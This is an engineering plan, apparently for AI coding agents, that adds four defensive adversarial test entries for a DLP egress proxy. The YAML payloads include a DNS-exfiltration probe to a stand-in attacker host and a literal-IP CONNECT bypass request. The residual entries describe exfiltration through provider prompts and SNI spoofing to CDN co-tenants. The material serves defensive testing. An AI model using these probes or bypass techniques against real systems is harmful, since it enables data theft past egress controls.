# G7-5 PR-C — Adversarial corpus §9 closure Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close the four remaining Spec C §9 adversarial-corpus classes — two passing-defense egress entries and two recorded design residuals — plus refresh the stale `dlp_egress` coverage matrix.

**Architecture:** Add four `dlp_egress` YAML payloads (`de-2026-013..016`) validated by the existing `payload_schema.py`, each with an executable `test_*.py`: `013` asserts the shipped compose connectivity-free invariant (core cannot resolve an external name); `015` drives the real `EgressForwardProxy` and asserts a literal-IP CONNECT is 403'd; `014`/`016` are `out_of_scope=true` recorded residuals whose test asserts the honest acknowledgement is present. No `src/` change — corpus + docs only.

**Tech Stack:** Python 3.12+, pytest (+ pytest-asyncio), Pydantic v2 (`AdversarialPayload`), PyYAML.

## Global Constraints

- **IDs**: `de-2026-013`, `de-2026-014`, `de-2026-015`, `de-2026-016` — monotonic, never reused; schema regex `^de-\d{4}-\d{3}$`. Prefix `de` ⟹ category `dlp_egress` (model-validator-enforced).
- **Schema** (`tests/adversarial/payload_schema.py`, `extra="forbid"`, `frozen=True`): required fields `id`, `category`, `threat` (min_length 1), `ingestion_path` (from the `IngestionPath` Literal), `payload` (`str | dict`), `expected_outcome` (from the `ExpectedOutcome` Literal), `provenance` (min_length 1), `references` (non-empty `tuple[str, ...]`). Optional `note`, `out_of_scope` (bool), `out_of_scope_rationale`.
- **Residual encoding**: recorded residuals (`de-2026-014`, `de-2026-016`) use `out_of_scope: true` + a non-empty `out_of_scope_rationale` — the schema's first-class threat-model-limit mechanism (the `tl-2026-003` pattern). The two fields move together (validator: `out_of_scope=true` ⟹ rationale required; rationale present ⟹ `out_of_scope` must be true). This is the honest, machine-flagged encoding; prefer it over a bare `expected_outcome` without the flag. Do **NOT** modify any existing entry (including `de-2026-002` — its encoding is out of PR-C scope; don't re-characterize it in the PR description without re-reading its semantics).
- **Real gates, not paper**: `013` and `015` ship executable assertions that genuinely fail on regression. No payload demonstrates a live exploit — residuals document an accepted scope-limit.
- **Filenames**: descriptive `de_egress_*.yaml` (dlp_egress convention), NOT id-prefixed. Tests load by explicit filename (the sbx `_load` glob does not apply here).
- **No `src/` change** ⟹ no `ci.yml` per-file coverage-gate edit. `conftest.py` schema-validates every new YAML at collection automatically.
- **i18n**: N/A (corpus YAML + test modules are not operator-facing `t()` strings).
- **Gates**: `uv run pytest tests/adversarial -q` green; `make check` before every push. Never `--no-verify`.
- **Reference spec**: `docs/superpowers/specs/2026-06-25-spec-c-egress-control-plane-design.md` §4.1, §7, §9, §10. This-PR spec: `docs/superpowers/specs/2026-07-01-g7-5-invariant-corpus-docs-design.md` §4.

---

### Task 1: `de-2026-013` — core cannot resolve an external name (DNS-exfil, §9 class 3)

**Files:**

- Create: `tests/adversarial/dlp_egress/de_egress_core_dns_isolation.yaml`
- Create: `tests/adversarial/dlp_egress/test_de_egress_core_dns_isolation.py`

**Interfaces:**

- Consumes: `tests.adversarial.payload_schema.AdversarialPayload`; the shipped `docker-compose.yaml` (`networks.alfred_internal.internal`, `services.alfred-core.networks`).
- Produces: nothing downstream (leaf corpus entry).

- [ ] **Step 1: Write the payload YAML**

Create `tests/adversarial/dlp_egress/de_egress_core_dns_isolation.yaml`:

```yaml
# de_egress_core_dns_isolation.yaml — dlp_egress adversarial payload.
# Spec C §7 (connectivity-free enforcement), §9 class 3 (DNS exfil).
# Schema: tests/adversarial/payload_schema.py.
id: de-2026-013
category: dlp_egress
threat: >-
  A compromised in-core module attempts to resolve an external hostname to
  exfiltrate T3 content over DNS; in the split topology the core sits on an
  internal-only network with no route to any external resolver, so getaddrinfo
  for an external name fails before any query leaves the host.
note: >-
  The kernel-observable proof (external-name resolution via getent/NSS failing
  inside the core's routeless network) is docker-gated and lives in
  tests/integration/egress/test_core_network_isolation_kernel.py
  (test_internal_network_blocks_egress_and_dns -> EXTERNAL_DNS_BLOCKED). This
  corpus entry is the always-on, non-docker ratchet: it asserts BOTH the shipped
  compose precondition that MAKES that resolution fail AND that the kernel proof
  still exists and still asserts the DNS hole is closed — so it adds a signal the
  compose-invariant lint does not (anti-rot on the runtime proof), not a third
  copy of that lint. Mirrors the sbx-2026-005/014 static-bytes pattern.
ingestion_path: web.fetch
payload:
  attack: dns_exfil_via_external_name_resolution
  probe: "getent hosts exfil.attacker.example  (external-name NSS resolution)"
  structural_precondition: "alfred_internal.internal == true AND alfred-core not on alfred_external"
expected_outcome: refused
provenance: >-
  Spec C §7 promotes the getaddrinfo-external-name-must-fail probe into the §9
  corpus; §9 class 3 is DNS exfil. The core performs no client-side DNS — the
  gateway resolves for both the proxy and the relay. ADR-0042 records the
  connectivity-free cutover (internal:true + core off alfred_external). This
  entry asserts the compose precondition; the kernel proof is cross-referenced.
references:
  - "docs/superpowers/specs/2026-06-25-spec-c-egress-control-plane-design.md §7, §9"
  - "docs/adr/0042-connectivity-free-core-cutover.md"
  - "tests/integration/egress/test_core_network_isolation_kernel.py"
```

- [ ] **Step 2: Write the failing executable test**

Create `tests/adversarial/dlp_egress/test_de_egress_core_dns_isolation.py`:

```python
"""Executable proof for de-2026-013 — the connectivity-free core cannot resolve
an external name in the split topology (Spec C §7 external-name-must-fail probe,
§9 class 3 DNS exfil).

Two assertions, each adding a signal the compose-invariant lint does NOT:

1. The SHIPPED compose precondition that makes external resolution fail — the
   core stays on the internal-only network and is not attached to the external
   network (with a positive control so it cannot pass vacuously on an empty
   networks list). This overlaps the required test_compose_invariants.py lint by
   design (defense-in-depth, framed as the DNS-exfil adversarial class).
2. Anti-rot on the runtime proof: the docker-gated kernel proof
   tests/integration/egress/test_core_network_isolation_kernel.py must still
   EXIST and still assert the DNS hole is closed (EXTERNAL_DNS_BLOCKED). If that
   proof is deleted or gutted, this corpus entry goes red — a signal no compose
   lint provides. This is the sbx-2026-005/014 static-bytes / anti-rot pattern
   applied to the core's DNS-exfil class.
"""

from __future__ import annotations

from pathlib import Path

import yaml

from tests.adversarial.payload_schema import AdversarialPayload

_YAML = Path(__file__).parent / "de_egress_core_dns_isolation.yaml"
_REPO_ROOT = Path(__file__).resolve().parents[3]
_COMPOSE = _REPO_ROOT / "docker-compose.yaml"
_KERNEL_PROOF = _REPO_ROOT / "tests" / "integration" / "egress" / "test_core_network_isolation_kernel.py"


def _load() -> AdversarialPayload:
    return AdversarialPayload.model_validate(yaml.safe_load(_YAML.read_text()))


def test_de_2026_013_schema_valid_and_defended() -> None:
    payload = _load()
    assert payload.id == "de-2026-013"
    assert payload.category == "dlp_egress"
    assert payload.out_of_scope is False
    assert payload.expected_outcome == "refused"


def test_de_2026_013_core_cannot_resolve_external_name() -> None:
    compose = yaml.safe_load(_COMPOSE.read_text())
    internal = compose["networks"]["alfred_internal"] or {}
    assert internal.get("internal") is True, (
        "alfred_internal must be internal:true — the connectivity-free core has "
        "no route to an external resolver (de-2026-013 DNS-exfil defense)"
    )
    # compose 'networks' may be a list (short form) or a dict (long form);
    # set(...) yields network NAMES for both.
    core_net_names = set(compose["services"]["alfred-core"]["networks"])
    # Positive control: the core must STAY on the internal plane — guards against
    # an empty networks list making the absence check below pass vacuously.
    assert "alfred_internal" in core_net_names, (
        "alfred-core must stay attached to the internal-only network"
    )
    assert "alfred_external" not in core_net_names, (
        "alfred-core must not be attached to alfred_external — re-attaching it "
        "re-opens external DNS/egress from the core (de-2026-013)"
    )


def test_de_2026_013_kernel_proof_still_asserts_dns_hole_closed() -> None:
    # Anti-rot cross-reference: the runtime proof this corpus class relies on must
    # still exist and still assert the external-DNS hole is closed. If someone
    # deletes/guts test_core_network_isolation_kernel.py, this goes red — the
    # signal the compose lint cannot give.
    assert _KERNEL_PROOF.exists(), (
        "the connectivity-free-core kernel proof is missing — de-2026-013's "
        "runtime evidence has rotted away"
    )
    src = _KERNEL_PROOF.read_text(encoding="utf-8")
    assert "EXTERNAL_DNS_BLOCKED" in src, (
        "the kernel proof no longer asserts the external-DNS hole is closed — "
        "de-2026-013's §9 class-3 coverage lost its runtime backing"
    )
```

- [ ] **Step 3: Run the test to verify it passes (payload + invariant already hold)**

Run: `uv run pytest tests/adversarial/dlp_egress/test_de_egress_core_dns_isolation.py -v`
Expected: PASS (2 tests). If `test_de_2026_013_core_cannot_resolve_external_name` FAILS, the compose invariant regressed — that is a real finding: STOP and investigate `docker-compose.yaml` (do not weaken the test). If a `KeyError` on `services.alfred-core` / `networks.alfred_internal`, verify the exact key names against `tests/unit/**/test_compose_invariants.py` and correct the test to match the shipped keys.

- [ ] **Step 4: Confirm schema-collection validation picks it up**

Run: `uv run pytest tests/adversarial/dlp_egress -q -k de_2026_013`
Expected: PASS, no collection error (a malformed YAML would fail collection loudly via `conftest.py`).

- [ ] **Step 5: Commit**

```bash
git add tests/adversarial/dlp_egress/de_egress_core_dns_isolation.yaml \
        tests/adversarial/dlp_egress/test_de_egress_core_dns_isolation.py
git commit -m "security(corpus): de-2026-013 — core cannot resolve external name (§9 DNS exfil)"
```

---

### Task 2: `de-2026-015` — L7-proxy literal-IP CONNECT refusal (§9 class 5a)

**Files:**

- Create: `tests/adversarial/dlp_egress/de_egress_literal_ip_connect_refused.yaml`
- Create: `tests/adversarial/dlp_egress/test_de_egress_literal_ip_refused.py`

**Interfaces:**

- Consumes: `alfred.gateway.egress_proxy.EgressForwardProxy` (constructor: `allowlist`, `match`, `bind_host`, `port`, `audit`, `resolve`, `open_upstream`; entrypoint `_serve_connection(reader, writer)`); `alfred.egress.allowlist.exact_match`, `alfred.egress.allowlist.is_literal_ip`; `AdversarialPayload`.
- Produces: nothing downstream.

- [ ] **Step 1: Write the payload YAML**

Create `tests/adversarial/dlp_egress/de_egress_literal_ip_connect_refused.yaml`:

```yaml
# de_egress_literal_ip_connect_refused.yaml — dlp_egress adversarial payload.
# Spec C §4.1 (mode-(a) provider forward-proxy), §9 class 5 (raw-IP / literal-IP
# CONNECT bypass). Schema: tests/adversarial/payload_schema.py.
id: de-2026-015
category: dlp_egress
threat: >-
  A compromised in-core egress client issues a CONNECT to a literal IP address to
  bypass the hostname-based destination allowlist (and the gateway-side DNS +
  resolved-IP-globally-routable guard); the gateway L7 forward-proxy refuses the
  literal-IP CONNECT with a 403 before any tunnel opens.
ingestion_path: mcp.tool.output
payload:
  attack: literal_ip_connect_bypasses_hostname_allowlist
  connect_request: "CONNECT 203.0.113.5:443 HTTP/1.1"
  literal_ip_target: "203.0.113.5"
expected_outcome: refused
provenance: >-
  Spec C §4.1 (the proxy allowlist is hostname-based and the proxy resolves the
  host itself) + §9 class 5. A literal-IP CONNECT target is refused at
  EgressForwardProxy._authorize (EgressDenyReason.LITERAL_IP_TARGET, HTTP 403).
  Elevates the unit-level
  tests/unit/gateway/test_egress_proxy.py::test_connect_literal_ip_denied into
  the release-blocking adversarial corpus. 203.0.113.5 is RFC 5737 TEST-NET-3
  (documentation range — never a real host).
references:
  - "docs/superpowers/specs/2026-06-25-spec-c-egress-control-plane-design.md §4.1, §9"
  - "src/alfred/gateway/egress_proxy.py (EgressForwardProxy._authorize)"
  - "src/alfred/egress/allowlist.py (is_literal_ip)"
```

- [ ] **Step 2: Write the failing executable test**

Create `tests/adversarial/dlp_egress/test_de_egress_literal_ip_refused.py`:

```python
"""Executable proof for de-2026-015 — the gateway L7 forward-proxy refuses a
literal-IP CONNECT (Spec C §4.1; §9 class 5). Drives the REAL EgressForwardProxy
`_serve_connection` with an in-memory literal-IP CONNECT and asserts the 403 +
`literal_ip_target` audit reason — elevating the unit-level
test_egress_proxy.py::test_connect_literal_ip_denied into the release-blocking
adversarial corpus. Harness mirrors tests/unit/gateway/test_egress_proxy.py.
"""

from __future__ import annotations

import asyncio
from pathlib import Path

import pytest
import yaml

from alfred.egress.allowlist import exact_match, is_literal_ip
from alfred.gateway.egress_proxy import EgressForwardProxy
from tests.adversarial.payload_schema import AdversarialPayload

_YAML = Path(__file__).parent / "de_egress_literal_ip_connect_refused.yaml"
_ALLOWLIST = frozenset({("api.anthropic.com", 443)})


class _CaptureWriter:
    """In-memory StreamWriter stand-in (mirrors test_egress_proxy._CaptureWriter)."""

    def __init__(self) -> None:
        self.buf = bytearray()
        self.closed = False
        self.eof = False

    def write(self, data: bytes) -> None:
        self.buf += data

    async def drain(self) -> None:
        return None

    def write_eof(self) -> None:
        self.eof = True

    def close(self) -> None:
        self.closed = True


def _reader_with(payload: bytes) -> asyncio.StreamReader:
    reader = asyncio.StreamReader()
    reader.feed_data(payload)
    reader.feed_eof()
    return reader


def _load() -> AdversarialPayload:
    return AdversarialPayload.model_validate(yaml.safe_load(_YAML.read_text()))


def test_de_2026_015_schema_valid_and_target_is_literal_ip() -> None:
    payload = _load()
    assert payload.id == "de-2026-015"
    assert payload.out_of_scope is False
    assert payload.expected_outcome == "refused"
    # `payload.payload` is typed `str | dict`; these entries always use a mapping.
    # Narrow it (convention parity with test_de_egress_content_type_laundering.py).
    assert isinstance(payload.payload, dict)
    # The guard precondition: the payload's target genuinely IS a literal IP.
    assert is_literal_ip(payload.payload["literal_ip_target"]) is True


@pytest.mark.asyncio
async def test_de_2026_015_literal_ip_connect_refused() -> None:
    payload = _load()
    assert isinstance(payload.payload, dict)
    audit: list[tuple[str, dict[str, object]]] = []

    async def _never_open(_ip: str, _port: int) -> tuple[asyncio.StreamReader, _CaptureWriter]:
        raise AssertionError("upstream must not open for a literal-IP CONNECT")

    proxy = EgressForwardProxy(
        allowlist=_ALLOWLIST,
        match=exact_match,
        bind_host="127.0.0.1",
        port=0,
        audit=lambda event, fields: audit.append((event, fields)),
        resolve=lambda _h: "1.1.1.1",
        open_upstream=_never_open,  # type: ignore[arg-type]
    )
    writer = _CaptureWriter()
    request = (str(payload.payload["connect_request"]) + "\r\n\r\n").encode()
    await asyncio.wait_for(
        proxy._serve_connection(_reader_with(request), writer),  # type: ignore[arg-type]
        timeout=5,
    )
    assert b"403" in writer.buf, "a literal-IP CONNECT must be refused with 403"
    # Self-distinguishing: `_deny` writes the reason into the status line, so this
    # separates the literal-IP deny from a generic not-allowlisted 403 (both 403).
    assert b"literal_ip_target" in writer.buf
    assert any(f.get("reason") == "literal_ip_target" for _, f in audit), (
        "the refusal must audit reason=literal_ip_target"
    )
    # No executor-drain teardown: the literal-IP path denies at _authorize BEFORE
    # any off-loop resolve, so no worker thread accumulates (unlike the resolve
    # path that test_egress_proxy's autouse fixture drains).
```

- [ ] **Step 3: Run the test**

Run: `uv run pytest tests/adversarial/dlp_egress/test_de_egress_literal_ip_refused.py -v`
Expected: PASS (2 tests). If the async test errors on the `EgressForwardProxy(...)` constructor (signature drift), read `tests/unit/gateway/test_egress_proxy.py` lines 77-105 and match the current `_proxy(...)` construction exactly. If `b"403"` is absent, the literal-IP guard regressed — STOP and investigate `src/alfred/gateway/egress_proxy.py::_authorize` (do not weaken the test).

- [ ] **Step 4: Commit**

```bash
git add tests/adversarial/dlp_egress/de_egress_literal_ip_connect_refused.yaml \
        tests/adversarial/dlp_egress/test_de_egress_literal_ip_refused.py
git commit -m "security(corpus): de-2026-015 — L7-proxy literal-IP CONNECT refused (§9 class 5)"
```

---

### Task 3: `de-2026-014` + `de-2026-016` — recorded residuals (§9 classes 4 + 5b)

**Files:**

- Create: `tests/adversarial/dlp_egress/de_egress_mode_a_provider_prompt_residual.yaml`
- Create: `tests/adversarial/dlp_egress/de_egress_sni_spoof_cotenant_residual.yaml`
- Create: `tests/adversarial/dlp_egress/test_de_egress_recorded_residuals.py`

**Interfaces:**

- Consumes: raw YAML (`yaml.safe_load`) — the test asserts the honest-acknowledgement fields directly, mirroring `test_tier_laundering_cast_bypass.py::test_gc_traversal_out_of_scope_acknowledged`.
- Produces: nothing downstream.

- [ ] **Step 1: Write the `de-2026-014` residual YAML**

Create `tests/adversarial/dlp_egress/de_egress_mode_a_provider_prompt_residual.yaml`:

```yaml
# de_egress_mode_a_provider_prompt_residual.yaml — dlp_egress adversarial payload.
# Spec C §4.1 (mode-(a) TLS-passthrough), §9 class 4, §10 ADR-0040 residual (ii).
# RECORDED RESIDUAL (out_of_scope=true). Schema: tests/adversarial/payload_schema.py.
# NB: `expected_outcome: refused` names the destination-gate's disposition of a
# NON-allowlisted authority; THIS payload's attack (exfil to an ALLOWLISTED
# provider host) is the recorded residual that survives — read expected_outcome
# together with out_of_scope + the rationale, never in isolation.
id: de-2026-014
category: dlp_egress
threat: >-
  In mode-(a) provider egress the gateway L7 proxy is TLS-passthrough and
  destination-allowlisted only; a compromised orchestrator embeds exfil data in
  the provider PROMPT itself, which reaches an allowlisted provider endpoint
  unread — the proxy never inspects the TLS-wrapped request body.
ingestion_path: mcp.tool.output
payload:
  attack: provider_prompt_exfil_via_allowlisted_tls_passthrough
  note: exfil payload rides inside the plaintext prompt to an allowlisted provider host
expected_outcome: refused
out_of_scope: true
out_of_scope_rationale: >-
  Mode-(a) provider egress is TLS-passthrough by design: the gateway sees only
  the CONNECT destination (an allowlisted provider host), never the plaintext
  prompt, so native SDK streaming + prompt-cache are preserved and the API key
  stays sealed. The destination allowlist DOES refuse non-allowlisted authorities
  (expected_outcome refused), but content-level exfil via the prompt to an
  ALLOWLISTED destination is destination-gated only, not payload-inspected. This
  is an accepted design residual, recorded here and to be ratified in ADR-0040
  (Spec C §10, drafted by PR-D) as honest-scope residual (ii), so the absence of
  a content catch is a documented invariant, not a silent gap. The mode-(b)
  tool-egress relay DOES inspect + DLP-scan bodies; only mode-(a) provider egress
  is passthrough.
provenance: >-
  Spec C §4.1 (mode-(a) TLS-passthrough), §9 class 4 (mode-(a) provider-prompt
  exfil residual — recorded, not claimed caught), §10 honest-scope residual (ii)
  (ADR-0040 to be drafted by PR-D). Threat-model-limit encoding (schema
  out_of_scope) — same pattern as tl-2026-003.
references:
  - "docs/superpowers/specs/2026-06-25-spec-c-egress-control-plane-design.md §4.1, §9, §10"
  - "tests/adversarial/tier_laundering/tl_gc_traversal_out_of_scope.yaml"
```

- [ ] **Step 2: Write the `de-2026-016` residual YAML**

Create `tests/adversarial/dlp_egress/de_egress_sni_spoof_cotenant_residual.yaml`:

```yaml
# de_egress_sni_spoof_cotenant_residual.yaml — dlp_egress adversarial payload.
# Spec C §9 class 5 (surviving SNI-spoof residuals), §10 ADR-0040 residual (i).
# RECORDED RESIDUAL (out_of_scope=true). Schema: tests/adversarial/payload_schema.py.
# NB: `expected_outcome: refused` names the destination-gate's disposition of a
# NON-allowlisted authority (and literal-IP CONNECT); THIS payload's attack (a
# co-tenant behind the SAME allowlisted CDN fronting) is the recorded residual
# that survives — read expected_outcome with out_of_scope + rationale, not alone.
id: de-2026-016
category: dlp_egress
threat: >-
  A compromised Discord adapter SNI-spoofs to a CDN-cotenant host that shares the
  allowlisted destination's fronting (e.g. Cloudflare-fronted discord.com);
  because mode-(a) TLS-passthrough is SNI-blind, the L7 proxy cannot distinguish a
  co-tenant behind the same CDN edge from the allowlisted destination.
ingestion_path: mcp.tool.output
payload:
  attack: sni_spoof_to_cdn_cotenant_behind_allowlisted_fronting
  allowlisted_destination: discord.com
  cotenant_note: shares CDN fronting; SNI-passthrough cannot separate cotenants
expected_outcome: refused
out_of_scope: true
out_of_scope_rationale: >-
  The L7 proxy DOES refuse literal-IP CONNECT and resolves the host itself, and
  the destination allowlist (discord.com exact + *.discord.gg suffix) refuses
  non-allowlisted authorities (expected_outcome refused). The surviving residual:
  within an allowlisted CDN-fronted destination, TLS-passthrough is SNI-blind
  (and ECH defeats even an SNI-peek), so an attacker controlling a co-tenant
  behind the same fronting edge is indistinguishable from the allowlisted
  destination at the CONNECT layer. An accepted design residual, to be ratified
  in ADR-0040 (Spec C §10, drafted by PR-D) as honest-scope residual (i); the
  strict empty-netns + SCM_RIGHTS fd-broker model that would close it is reserved
  for the future in-house quarantine child.
provenance: >-
  Spec C §9 class 5 (SNI-spoof-to-cotenant + CDN-cotenant residuals recorded, not
  claimed caught), §10 honest-scope residual (i) (ADR-0040 to be drafted by
  PR-D). Threat-model-limit encoding (schema out_of_scope) — same pattern as
  tl-2026-003.
references:
  - "docs/superpowers/specs/2026-06-25-spec-c-egress-control-plane-design.md §9, §10"
  - "docs/adr/0043-discord-adapter-egress-l7-proxy-netns-bridge.md"
  - "tests/adversarial/tier_laundering/tl_gc_traversal_out_of_scope.yaml"
```

- [ ] **Step 3: Write the acknowledgement test**

Create `tests/adversarial/dlp_egress/test_de_egress_recorded_residuals.py`:

```python
"""Recorded-residual acknowledgements for the two Spec C §9 egress residuals that
survive the destination-allowlist / TLS-passthrough design by construction:

* de-2026-014 — mode-(a) provider-prompt exfil (TLS-passthrough is destination-
  gated only; the proxy never inspects the wrapped request body).
* de-2026-016 — Discord SNI-spoof-to-cotenant / CDN-cotenant (TLS-passthrough is
  SNI-blind; a co-tenant behind the same CDN fronting is indistinguishable).

Neither is a defended vector — each is an ACCEPTED design residual recorded in
ADR-0040's honest-scope section. These tests assert the honest encoding is present
(out_of_scope=true + a non-empty rationale) so the absence of a catch is a
documented invariant, not a silent gap — the tl-2026-003 acknowledgement pattern.
"""

from __future__ import annotations

from pathlib import Path

import pytest
import yaml

_DIR = Path(__file__).parent


@pytest.mark.parametrize(
    "filename",
    [
        "de_egress_mode_a_provider_prompt_residual.yaml",
        "de_egress_sni_spoof_cotenant_residual.yaml",
    ],
)
def test_recorded_residual_carries_out_of_scope_acknowledgement(filename: str) -> None:
    path = _DIR / filename
    assert path.exists(), f"missing recorded-residual payload {filename}"
    payload = yaml.safe_load(path.read_text())
    assert payload.get("out_of_scope") is True, (
        f"{filename} records an accepted design residual — it must be marked "
        "out_of_scope=true, not claimed caught"
    )
    rationale = (payload.get("out_of_scope_rationale") or "").strip()
    assert rationale, f"{filename} must carry a non-empty out_of_scope_rationale (the WHY)"
```

- [ ] **Step 4: Run the test**

Run: `uv run pytest tests/adversarial/dlp_egress/test_de_egress_recorded_residuals.py -v`
Expected: PASS (2 parametrized cases). A `pydantic.ValidationError` at collection means a residual YAML violates the `out_of_scope`/rationale pairing — read the `conftest.py` error and fix the YAML.

- [ ] **Step 5: Commit**

```bash
git add tests/adversarial/dlp_egress/de_egress_mode_a_provider_prompt_residual.yaml \
        tests/adversarial/dlp_egress/de_egress_sni_spoof_cotenant_residual.yaml \
        tests/adversarial/dlp_egress/test_de_egress_recorded_residuals.py
git commit -m "security(corpus): de-2026-014/016 — recorded egress residuals (§9 classes 4, 5b)"
```

---

### Task 4: Refresh the `dlp_egress` coverage-matrix README

**Files:**

- Modify: `tests/adversarial/dlp_egress/README.md` (coverage matrix table, currently ends at `de-2026-010`)

**Interfaces:**

- Consumes: the `threat:` + `id:` of `de_egress_content_type_laundering.yaml` (de-2026-011) and `de_egress_inbound_canary_unwired.yaml` (de-2026-012), read at execution time; the four new entries from Tasks 1-3.
- Produces: an up-to-date matrix (the README's own text declares matrix↔corpus drift a release-blocker).

- [ ] **Step 1: Read the two omitted entries' threat lines AND their owning PR**

Run: `grep -A2 '^id:' tests/adversarial/dlp_egress/de_egress_content_type_laundering.yaml tests/adversarial/dlp_egress/de_egress_inbound_canary_unwired.yaml`
Note the `id` and a one-line paraphrase of each `threat`.
Run: `git log --oneline -- tests/adversarial/dlp_egress/de_egress_content_type_laundering.yaml tests/adversarial/dlp_egress/de_egress_inbound_canary_unwired.yaml | head`
Use the introducing commit's PR/slice for the "Owning PR" column — do NOT hardcode; the existing `de-2026-007..010` rows attribute to `PR #333 G7-2c-2`, so these two likely match, but confirm from git before writing.

- [ ] **Step 2: Append the six missing rows to the coverage matrix**

In `tests/adversarial/dlp_egress/README.md`, in the `| Attack vector | Owning PR / Task |` table (after the `de-2026-010` row), add — using the paraphrased threats from Step 1 for `011`/`012` and verbatim for the four new entries:

```markdown
| Content-type laundering: outbound body mislabels its content-type to smuggle a secret past the gateway DLP pass | PR #333 G7-2 (`de-2026-011` `de_egress_content_type_laundering.yaml` + `test_de_egress_content_type_laundering.py`) |
| Inbound canary planted in T3 content that is not yet wired to the egress scanner | PR #333 (`de-2026-012` `de_egress_inbound_canary_unwired.yaml` + `test_de_egress_inbound_canary_unwired.py`) |
| Core cannot resolve an external name in the split topology (DNS exfil; §7 getaddrinfo-must-fail probe) — asserts the shipped compose connectivity-free invariant; kernel proof in `tests/integration/egress/` | PR #333 G7-5 (`de-2026-013` `de_egress_core_dns_isolation.yaml`) |
| Mode-(a) provider-prompt exfil — RECORDED RESIDUAL: TLS-passthrough is destination-gated only, no body inspection (ADR-0040 residual (ii)) | PR #333 G7-5 (`de-2026-014` `de_egress_mode_a_provider_prompt_residual.yaml`, `out_of_scope=true`) |
| L7-proxy literal-IP CONNECT refusal — drives the real `EgressForwardProxy`, asserts 403 + `literal_ip_target` | PR #333 G7-5 (`de-2026-015` `de_egress_literal_ip_connect_refused.yaml`) |
| Discord SNI-spoof-to-cotenant / CDN-cotenant — RECORDED RESIDUAL: TLS-passthrough is SNI-blind within allowlisted fronting (ADR-0040 residual (i)) | PR #333 G7-5 (`de-2026-016` `de_egress_sni_spoof_cotenant_residual.yaml`, `out_of_scope=true`) |
```

Verify the paraphrased `011`/`012` descriptions match those files' actual `threat:` intent; adjust wording to fit if Step 1 shows a different emphasis.

- [ ] **Step 3: Commit**

```bash
git add tests/adversarial/dlp_egress/README.md
git commit -m "docs(corpus): refresh dlp_egress coverage matrix through de-2026-016"
```

---

### Task 5: Full-suite verification + quality gates

**Files:** none (verification only).

- [ ] **Step 1: Run the full adversarial suite**

Run: `uv run pytest tests/adversarial -q`
Expected: PASS. Confirms (a) all four new YAMLs schema-validate at collection, (b) the density guard `test_dlp_egress_corpus_has_payloads` stays green (count only rose — no xfail marker to remove), (c) no existing corpus entry regressed.

**Heads-up (do NOT "fix"):** two PRE-EXISTING strict-xfail tests unrelated to PR-C — `tests/adversarial/dlp_egress/test_de_egress_inbound_canary_unwired.py` and `tests/adversarial/dlp_egress/test_egress_no_orphan_and_inflight.py` — are PR #339 merge-blockers and appear as `XFAIL` (the expected green state, not `XPASS`, not `FAIL`). Do not touch them; they are out of PR-C scope.

- [ ] **Step 2: Confirm the four ids are present and unique**

Run: `grep -rhoE '^id:\s*de-2026-01[3-6]' tests/adversarial/dlp_egress/ | sort`
Expected: exactly `de-2026-013`, `de-2026-014`, `de-2026-015`, `de-2026-016` (one each).

- [ ] **Step 3: Run the full quality gate**

Run: `make check`
Expected: lint + format + type + test all green. If `ruff format --check` flags the new test modules, run `uv run ruff format tests/adversarial/dlp_egress/` and amend. (Check `$?` — do not read a `| tail` exit code.)

- [ ] **Step 4: Final commit if `make check` produced formatting changes**

```bash
git add -A tests/adversarial/dlp_egress/
git commit -m "style(corpus): ruff-format the de-2026-013..016 test modules" || echo "nothing to format"
```

---

## Self-Review

**1. Spec coverage** (against this-PR spec §4 + reference-spec §9):

- §9 class 3 (DNS exfil) → Task 1 (`de-2026-013`). ✓
- §9 class 4 (mode-(a) residual) → Task 3 (`de-2026-014`, `out_of_scope`). ✓
- §9 class 5a (literal-IP CONNECT refusal) → Task 2 (`de-2026-015`). ✓
- §9 class 5b (SNI-cotenant residual) → Task 3 (`de-2026-016`, `out_of_scope`). ✓
- README coverage-matrix refresh → Task 4. ✓
- Classes 1/2/6/7/8 + sbx-005 flip + Discord migration → already landed (this-PR spec §3); no task, by design. ✓

**2. Placeholder scan:** No "TBD/TODO/implement later". Task 4 Step 1-2 is an explicit read-then-add-row with the format + four rows given verbatim and the two backfill rows paraphrased — a concrete mechanical step, not a vague placeholder.

**3. Type/name consistency:** YAML ids (`de-2026-013..016`) match test assertions and filenames; `EgressForwardProxy` constructor kwargs (`allowlist`/`match`/`bind_host`/`port`/`audit`/`resolve`/`open_upstream`) + `_serve_connection` match `tests/unit/gateway/test_egress_proxy.py`; audit reason string `"literal_ip_target"` matches `EgressDenyReason.LITERAL_IP_TARGET`; `is_literal_ip`/`exact_match` imports from `alfred.egress.allowlist`; residual `out_of_scope`/`out_of_scope_rationale` field names match `payload_schema.py`.

## Execution Handoff

Detailed at the end of the session — the plan is ready for subagent-driven or inline execution.
